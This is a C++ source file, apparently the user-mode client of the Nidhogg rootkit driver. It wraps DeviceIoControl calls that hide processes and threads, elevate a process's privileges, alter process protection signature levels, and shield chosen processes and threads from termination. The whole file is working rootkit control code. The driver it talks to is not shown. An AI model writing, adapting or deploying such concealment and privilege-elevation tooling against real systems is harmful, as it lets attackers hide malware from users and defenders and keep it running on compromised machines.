#include "pch.h"
#include "Nidhogg.h"

NidhoggErrorCodes NidhoggInterface::ProcessProtect(DWORD pid) {
	DWORD returned;
	ProtectedProcess protectedProcess = { pid, true };

	if (!DeviceIoControl(this->hNidhogg, IOCTL_PROTECT_UNPROTECT_PROCESS, &protectedProcess, sizeof(protectedProcess),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::ProcessUnprotect(DWORD pid) {
	DWORD returned;
	ProtectedProcess protectedProcess = { pid, false };

	if (!DeviceIoControl(this->hNidhogg, IOCTL_PROTECT_UNPROTECT_PROCESS, &protectedProcess, sizeof(protectedProcess),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::ProcessClearAllProtection() {
	DWORD returned;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_CLEAR_PROCESS_PROTECTION, nullptr, 0, nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::ThreadProtect(DWORD tid) {
	DWORD returned;
	ProtectedThread protectedThread = { tid, true };

	if (!DeviceIoControl(this->hNidhogg, IOCTL_PROTECT_UNPROTECT_THREAD, &protectedThread, sizeof(protectedThread),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::ThreadUnprotect(DWORD tid) {
	DWORD returned;
	ProtectedThread protectedThread = { tid, false };

	if (!DeviceIoControl(this->hNidhogg, IOCTL_PROTECT_UNPROTECT_THREAD, &protectedThread, sizeof(protectedThread),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::ThreadClearAllProtection() {
	DWORD returned;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_CLEAR_THREAD_PROTECTION, nullptr, 0, nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::ProcessHide(DWORD pid) {
	DWORD returned;
	HiddenProcess hiddenProcess = { pid, true };

	if (!DeviceIoControl(this->hNidhogg, IOCTL_HIDE_UNHIDE_PROCESS, &hiddenProcess, sizeof(hiddenProcess), nullptr, 0,
		&returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::ProcessUnhide(DWORD pid) {
	DWORD returned;
	HiddenProcess hiddenProcess = { pid, false };

	if (!DeviceIoControl(this->hNidhogg, IOCTL_HIDE_UNHIDE_PROCESS, &hiddenProcess, sizeof(hiddenProcess), nullptr, 0,
		&returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::ThreadHide(DWORD tid) {
	DWORD returned;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_HIDE_THREAD, &tid, sizeof(tid), nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::ProcessElevate(DWORD pid) {
	DWORD returned;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_ELEVATE_PROCESS, &pid, sizeof(pid), nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
	return NIDHOGG_SUCCESS;
}

NidhoggErrorCodes NidhoggInterface::ProcessSetProtection(DWORD pid, UCHAR signerType, UCHAR signatureSigner) {
	DWORD returned;
	ProcessSignature processSignature{};

	processSignature.Pid = pid;
	processSignature.SignerType = signerType;
	processSignature.SignatureSigner = signatureSigner;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_SET_PROCESS_SIGNATURE_LEVEL, &processSignature, sizeof(processSignature),
		nullptr, 0, &returned, nullptr))
		return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
	return NIDHOGG_SUCCESS;
}

std::vector<DWORD> NidhoggInterface::QueryProcesses() {
	DWORD returned;
	OutputProtectedProcessesList result{};
	std::vector<DWORD> pids;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_QUERY_PROTECTED_PROCESSES, nullptr, 0, &result, sizeof(result), &returned,
		nullptr)) {

		pids.push_back(NIDHOGG_ERROR_DEVICECONTROL_DRIVER);
		return pids;
	}

	for (int i = 0; i < result.PidsCount; i++) {
		pids.push_back(result.Processes[i]);
	}
	return pids;
}

std::vector<DWORD> NidhoggInterface::QueryThreads() {
	DWORD returned;
	OutputThreadsList result{};
	std::vector<DWORD> tids;

	if (!DeviceIoControl(this->hNidhogg, IOCTL_QUERY_PROTECTED_THREADS, nullptr, 0, &result, sizeof(result), &returned,
		nullptr)) {

		tids.push_back(NIDHOGG_ERROR_DEVICECONTROL_DRIVER);
		return tids;
	}

	for (int i = 0; i < result.TidsCount; i++) {
		tids.push_back(result.Threads[i]);
	}
	return tids;
}